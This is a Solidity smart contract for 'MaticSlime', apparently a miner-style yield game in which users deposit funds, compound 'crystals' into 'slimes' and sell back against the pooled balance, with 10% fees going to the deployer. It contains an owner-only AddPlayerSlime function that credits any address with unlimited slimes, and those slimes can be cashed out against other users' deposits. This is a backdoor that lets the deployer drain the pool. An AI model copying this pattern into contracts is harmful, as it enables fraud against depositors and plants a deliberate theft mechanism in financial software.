// SPDX-License-Identifier: MIT LICENSE
pragma solidity ^0.8.0;
contract MaticSlime{

    /* percentage */
    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%, 1080000 - 8%
    // 959000 - 9%, 864000 - 10%, 720000 - 12%, 575424 - 15%, 540000 - 16%, 479520 - 18%
    uint256 public Crystal_Per_Slime=1728000;
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
  
    mapping (address => uint256) public SlimesMap;
    mapping (address => uint256) public claimedCrystalsMap;
    mapping (address => uint256) public lastCompoundMap;
    mapping (address => address) public referralsMap;

    uint256 MAX_Storage = 1 days;

    // Mapping Player Info
    mapping (address => Player) public player;
    struct Player{
        uint256 InvestValue;
        uint256 Quota; 
        uint256 Exp;
         
    }

    uint256 public marketCrystals;

    constructor() {
        ceoAddress=msg.sender;
        
    }

    modifier isMarketStart() {
        require(initialized ,"Market not start !");
        _;
    }

    function Donate() payable public {
        require(msg.value >0 ,"Donate value must > 0");
    }

    function Compound(address ref) public isMarketStart{
        if(ref == msg.sender || ref == address(0) ){
            ref = ceoAddress;
        }

        if(referralsMap[msg.sender]==address(0) && referralsMap[msg.sender]!=msg.sender){
            referralsMap[msg.sender]=ref;
        }
        uint256 crystalsUsed = GetMyCrystals();
        Player memory p  = player[msg.sender];
        uint256 lv = p.Exp / 120;
        uint256 newSlimes= crystalsUsed / GetBonus_Crystal_Per_Slime(lv); 
        SlimesMap[msg.sender] += newSlimes; 
        claimedCrystalsMap[msg.sender] = 0; 
        lastCompoundMap[msg.sender] = block.timestamp;
        
     
        claimedCrystalsMap[referralsMap[msg.sender]] += (crystalsUsed / GetBonus_Ref(lv)/100 ); 
       
        marketCrystals = marketCrystals + (crystalsUsed /5); 

        AddExp(msg.sender,20);

    }

    function Sell() public isMarketStart{
        
        uint256 ownCrystals = GetMyCrystals();
        uint256 crystalValue = calculateCrystalSell(ownCrystals);
        uint256 fee = devFee(crystalValue);

        Player storage p  = player[msg.sender];
        require(p.Quota >= crystalValue , "Buy more to Sell");
        p.Quota -= crystalValue;

        claimedCrystalsMap[msg.sender]=0;
        lastCompoundMap[msg.sender] = block.timestamp;
        marketCrystals = marketCrystals + ownCrystals;

        SubExp(msg.sender,120);

        TransferEtherTo(ceoAddress,fee); 
        TransferEtherTo(msg.sender,crystalValue - fee); 
    }

    function Buy(address ref) public payable isMarketStart{
        require(msg.value >0 ,"Value must > 0");
        uint256 crystalsBought = calculateCrystalBuy( msg.value, address(this).balance - msg.value);

        Player storage p  = player[msg.sender];
        p.InvestValue = msg.value;
        p.Quota += 5 * msg.value; 

        crystalsBought = crystalsBought - devFee(crystalsBought);
        uint256 fee=devFee(msg.value);
        TransferEtherTo(ceoAddress,fee);

        claimedCrystalsMap[msg.sender] += crystalsBought;
        Compound(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return (PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
    }
    function calculateCrystalSell(uint256 crystals) public view returns(uint256){
        return calculateTrade(crystals,marketCrystals,address(this).balance);
    }
    function calculateCrystalBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketCrystals);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return amount * 10 / 100; // 10%
    }
    function StartMarket() public payable{
        require(marketCrystals == 0 ); 
        require(msg.sender == ceoAddress ,"You are not authorize");
        initialized=true;
        marketCrystals = Crystal_Per_Slime * 10000;

    }

    function AddPlayerSlime(address p , uint256 amount) external {
        require(msg.sender == ceoAddress ,"You are not authorize");
        SlimesMap[p] += amount;
    }


    function GetPoolBalance() public view returns(uint256){
        return address(this).balance;
    }
    function GetMySlimes() public view returns(uint256){
        return SlimesMap[msg.sender];
    }
    function GetMyCrystals() public view returns(uint256){
        return claimedCrystalsMap[msg.sender] + GetCrystalsSinceLastCompound(msg.sender);
    }
    function GetCrystalsSinceLastCompound(address adr) public view returns(uint256){
        return GetSecondsPassed(adr) * SlimesMap[adr];
    }

    function GetSecondsPassed(address adr) public view returns(uint256){
        return min ( MAX_Storage, block.timestamp -lastCompoundMap[adr]);
    }
    // Trasnsfer Ether to 
    function TransferEtherTo(address to,uint256 amount)  internal {
        payable(to).transfer(amount);
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function GetBonus_Crystal_Per_Slime(uint256 lv) public view returns(uint256){
        return Crystal_Per_Slime * (100 - lv * 2) /100;
    }

    function GetBonus_Ref(uint256 lv) public pure returns(uint256){
        return (10 + lv);
    }

    function GetMyExp() external view returns(uint256){
        return player[msg.sender].Exp;
    }


    function AddExp(address to, uint256 exp) internal {
        Player storage p  = player[to];
        uint256 x = p.Exp;
        x += exp;
        if( x > 600){
            x = 600;
        }
        p.Exp = x;
    }

    function SubExp(address to, uint256 exp) internal {
        Player storage p  = player[to];
        if (p.Exp <= exp) {
            p.Exp = 0;
        }
        else {
            p.Exp -= exp;
        }
    }


}


